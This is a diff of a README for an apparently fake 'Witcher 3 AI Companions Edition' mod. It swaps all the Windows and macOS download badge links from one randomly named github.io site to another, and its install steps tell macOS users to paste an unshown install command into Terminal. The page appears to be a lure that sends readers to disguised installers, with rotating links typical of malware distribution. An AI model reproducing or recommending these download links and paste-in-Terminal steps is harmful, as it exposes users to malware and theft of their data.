@@ -8,8 +8,8 @@
 
 ---
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beauticianblaze.github.io/DownloadWin/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beauticianblaze.github.io/DownloadMac/)
 
 ---
 
@@ -46,13 +46,13 @@ This is an **AI-powered mod**. Using a large language model running locally or v
 
 ### 🪟 Windows
 
-1. [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
+1. [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beauticianblaze.github.io/DownloadWin/)
 2. Run the installer and follow the on-screen steps
 3. Launch The Witcher 3 — mod activates automatically 🚀
 
 ### 🍎 macOS
 
-1. [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
+1. [![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beauticianblaze.github.io/DownloadMac/)
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
 3. Paste the install command and press Enter
 4. Follow the prompts — installs automatically 🍏
@@ -86,8 +86,8 @@ This is an **AI-powered mod**. Using a large language model running locally or v
 
 **Witcher 3 AI Companions Edition** transforms your The Witcher 3 experience. Download now and see the difference immediately.
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beauticianblaze.github.io/DownloadWin/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beauticianblaze.github.io/DownloadMac/)
 
 ---
 
